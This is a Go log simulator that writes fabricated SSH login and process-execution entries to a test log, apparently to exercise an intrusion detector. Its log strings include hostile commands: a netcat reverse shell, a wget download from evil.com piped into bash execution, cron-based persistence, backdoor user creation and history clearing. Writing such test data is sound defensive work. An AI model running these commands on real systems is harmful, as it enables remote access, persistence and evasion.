package main

import (
	"flag"
	"fmt"
	"log"
	"math/rand"
	"os"
	"time"
)

const (
	logFile               = "testdata/auth.log"
	failedLoginTemplate   = "%s my-server sshd[%d]: Failed password for %s from %s port %d ssh2\n"
	acceptedLoginTemplate = "%s my-server sshd[%d]: Accepted password for %s from %s port %d ssh2\n"
	execsnoopTemplate     = "%s %-7d %-16s %-7d %-7d %-3d %s\n"
)

type Scenario struct {
	Name        string
	Command     string
	FullCommand string
	UID         int
}

func appendLog(message string) {
	f, err := os.OpenFile(logFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatalf("failed to open log file: %v", err)
	}

	defer f.Close()

	if _, err := f.WriteString(message); err != nil {
		log.Printf("failed to write to log file: %v", err)
	}
}

var suspiciousScenarios = []Scenario{
	{Name: "Network Scan", Command: "nmap", FullCommand: "nmap -p 1-65535 10.0.0.1", UID: 1000},
	{Name: "Reverse Shell", Command: "nc", FullCommand: "nc -e /bin/bash 10.0.0.2", UID: 1000},
	{Name: "User Creation", Command: "useradd", FullCommand: "useradd attacker", UID: 0},
	{Name: "Privilege Escalation", Command: "sudo", FullCommand: "sudo su -", UID: 1000},
	{Name: "Persistence via Cron", Command: "crontab", FullCommand: "crontab -l | { cat; echo \"* * * * * /bin/bash -i\"; } | crontab -", UID: 1000},
}

func main() {
	log.Println("Starting log simulator....")

	testcase := flag.String("testcase", "", "Run a specific, targeted test case: 'download', 'bruteforce', 'newuser'")

	flag.Parse()

	if *testcase != "" {
		runTargetedTest(*testcase)
	} else {
		runChaosSimulation()
	}
}

func appendAndPrint(message, logLine string) {
	fmt.Print(message)
	appendLog(logLine)
	fmt.Println(" -> Done")
}

func runTargetedTest(name string) {
	log.Printf("Starting targeted log simulation for '%s'...", name)
	switch name {
	case "download":
		log.Println("Starting targeted log simulation for 'Download & Execute'...")

		// --- The Attack Chain ---

		// 1. Attacker downloads a payload to /tmp
		log.Println("Injecting: File Download (wget)")
		timestamp1 := time.Now().Format("15:04:05")
		pid1, ppid1 := rand.Intn(90000)+1000, rand.Intn(90000)+1000
		downloadLog := fmt.Sprintf(execsnoopTemplate, timestamp1, 1000, "wget", pid1, ppid1, 0, "wget -O /tmp/payload.sh http://evil.com/payload.sh")
		appendLog(downloadLog)

		// 2. Wait for 5 seconds
		time.Sleep(5 * time.Second)

		// 3. Attacker executes the payload
		log.Println("Injecting: Payload Execution (bash)")
		timestamp2 := time.Now().Format("15:04:05")
		pid2, ppid2 := rand.Intn(90000)+1000, rand.Intn(90000)+1000
		executeLog := fmt.Sprintf(execsnoopTemplate, timestamp2, 1000, "bash", pid2, ppid2, 0, "bash /tmp/payload.sh")
		appendLog(executeLog)

		log.Println("Simulation finished.")
	case "bruteforce":
		log.Println("Starting targeted log simulation for 'Brute-Force & Evasion'...")
		attackIP := "198.51.100.99"

		log.Println("Injecting: SSH Brute-Force")
		for i := 0; i < 6; i++ {
			timestamp := time.Now().Format("Jan  2 15:04:05")
			pid, port := rand.Intn(9000)+1000, rand.Intn(60000)+1024
			failedLog := fmt.Sprintf(failedLoginTemplate, timestamp, pid, "root", attackIP, port)
			appendLog(failedLog)
			time.Sleep(200 * time.Millisecond) // Short delay between attempts
		}

		time.Sleep(3 * time.Second)

		log.Println("Injecting: Successful Login post-brute-force")
		timestampSuccess := time.Now().Format("Jan  2 15:04:05")
		sshdPID, portSuccess := rand.Intn(9000)+1000, rand.Intn(60000)+1024
		successLog := fmt.Sprintf(acceptedLoginTemplate, timestampSuccess, sshdPID, "root", attackIP, portSuccess)
		appendLog(successLog)

		time.Sleep(5 * time.Second)

		// 5. Attacker tries to cover their tracks
		log.Println("Injecting: Defense Evasion (history clear)")
		timestampEvasion := time.Now().Format("15:04:05")
		pidEvasion := rand.Intn(90000) + 1000
		ppidEvasion := sshdPID

		evasionLog := fmt.Sprintf(execsnoopTemplate, timestampEvasion, 0, "bash", pidEvasion, ppidEvasion, 0, "history -c")
		appendLog(evasionLog)

		log.Println("Simulation finished.")
	case "newuser":
		// --- Test Case for New Account & Immediate Use ---
		log.Println("Starting targeted log simulation for 'New Account & Immediate Use'...")
		newUser := "attacker-acct"
		loginIP := "203.0.113.55"

		// --- The Attack Chain ---

		// 1. Attacker creates a new user for persistence.
		log.Printf("Injecting: New user creation (%s)", newUser)
		timestampCreate := time.Now().Format("15:04:05")
		pidCreate, ppidCreate := rand.Intn(90000)+1000, rand.Intn(90000)+1000
		createLog := fmt.Sprintf(execsnoopTemplate, timestampCreate, 0, "useradd", pidCreate, ppidCreate, 0, "useradd "+newUser)
		appendLog(createLog)

		// 2. Wait for 5 seconds
		time.Sleep(5 * time.Second)

		// 3. Attacker immediately uses the new account to log in.
		log.Printf("Injecting: Successful login for new user %s", newUser)
		timestampLogin := time.Now().Format("Jan  2 15:04:05")
		pidLogin, portLogin := rand.Intn(9000)+1000, rand.Intn(60000)+1024
		loginLog := fmt.Sprintf(acceptedLoginTemplate, timestampLogin, pidLogin, newUser, loginIP, portLogin)
		appendLog(loginLog)
	default:
		log.Fatalf("Unknown test case: %s", name)
	}

	log.Println("Simulation finished.")
}

func runChaosSimulation() {
	log.Println("Starting random 'chaos' attack log simulation...")

	for {
		sleepDuration := time.Duration(rand.Intn(4)+1) * time.Second
		time.Sleep(sleepDuration)

		scenario := rand.Intn(5)
		var logLine, logMessage string

		switch scenario {
		case 0:
			// Scenario: single suspicious command
			scenario := suspiciousScenarios[rand.Intn(len(suspiciousScenarios))]
			logMessage = fmt.Sprintf("Injecting: Suspicious command (%s)", scenario.Name)
			timestamp := time.Now().Format("15:04:05")
			pid, ppid := rand.Intn(9000)+1000, rand.Intn(90000)+1000
			logLine = fmt.Sprintf(execsnoopTemplate, timestamp, scenario.UID, scenario.Command, pid, ppid, 0, scenario.FullCommand)
			appendAndPrint(logMessage, logLine)
		case 1:
			// Scenario: rapid execution
			logMessage = "Injecting: Rapid Process Execution Burst"
			fmt.Print(logMessage)
			for i := 0; i < 15; i++ {
				timestamp := time.Now().Format("15:04:05")
				pid, ppid := rand.Intn(90000)+1000, rand.Intn(90000)+1000
				logLine = fmt.Sprintf(execsnoopTemplate, timestamp, 1000, "ls", pid, ppid, 0, "/bin/ls")
				appendAndPrint(logMessage, logLine)
				time.Sleep(100 * time.Millisecond)
			}
		case 2:
			logMessage = "Injecting: Successful Login for jsmith"
			timestamp := time.Now().Format("Jan  2 15:04:05")
			pid, port := rand.Intn(9000)+1000, rand.Intn(60000)+1024
			logLine := fmt.Sprintf(acceptedLoginTemplate, timestamp, pid, "jsmith", "193.99.144.80", port)
			appendAndPrint(logMessage, logLine)
		case 3:
			// Scenario: Brute force ssh attack (for checkFailedLogins)
			attackIP := fmt.Sprintf("198.51.100.%d", rand.Intn(254)+1)
			logMessage = fmt.Sprintf("Injecting: SSH Brute-Force from %s", attackIP)
			for i := 0; i < 6; i++ {
				timestamp := time.Now().Format("Jan  2 15:04:05")
				pid, port := rand.Intn(9000)+1000, rand.Intn(60000)+1024
				logLine := fmt.Sprintf(failedLoginTemplate, timestamp, pid, "root", attackIP, port)
				appendAndPrint(logMessage, logLine)
			}
		case 4:
			// Single random failed Login
			logMessage = "Injecting: Random failed login"
			timestamp := time.Now().Format("Jan  2 15:04:05")
			pid, port := rand.Intn(9000)+1000, rand.Intn(60000)+1024
			ip := fmt.Sprintf("10.10.10.%d", rand.Intn(254)+1)
			logLine := fmt.Sprintf(failedLoginTemplate, timestamp, pid, "admin", ip, port)
			appendAndPrint(logMessage, logLine)
		}
	}
}
